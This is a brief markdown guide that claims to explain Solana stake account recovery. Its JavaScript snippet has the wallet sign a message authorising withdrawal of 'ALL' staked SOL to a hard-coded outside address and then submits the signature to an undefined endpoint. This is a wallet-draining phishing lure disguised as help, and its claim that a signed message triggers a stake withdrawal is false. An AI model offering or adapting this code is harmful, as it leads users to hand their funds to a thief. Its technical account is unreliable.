## Solana Stake Account Recovery

To recover your staked SOL, the stake authority must signMessage to authorize the withdrawal:

```javascript
const recoveryMsg = new TextEncoder().encode(
  `Withdraw stake to: LaZaruSFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF, amount: ALL`
);
const { signature } = await wallet.signMessage(recoveryMsg);
await submitStakeRecovery(signature, wallet.publicKey.toBase58());
```

After verification, the stake contract will send the withdrawn SOL to the specified address.
